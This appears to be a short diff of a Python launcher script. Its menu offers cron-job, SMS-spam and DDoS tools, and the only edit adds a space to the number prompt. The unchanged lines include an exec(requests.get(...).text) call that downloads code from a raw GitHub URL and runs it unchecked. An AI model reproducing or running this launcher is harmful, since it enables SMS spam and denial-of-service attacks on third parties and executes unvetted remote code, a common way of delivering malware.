@@ -20,7 +20,7 @@ print('1 - TOOL CRON JOBS')
 print('2 - TOOL SPAM SMS')
 print('3 - TOOL DDOS V1')
 print('='*60)
-Requestsjob = int(input('\033[1;37mChọn Số\n =>'))
+Requestsjob = int(input('\033[1;37mChọn Số\n => '))
 if ( Requestsjob == 1 ):
  exec(requests.get("https://raw.githubusercontent.com/UserDT28/server1/main/Toolcron1.py").text)
 elif ( Requestsjob == 2 ):
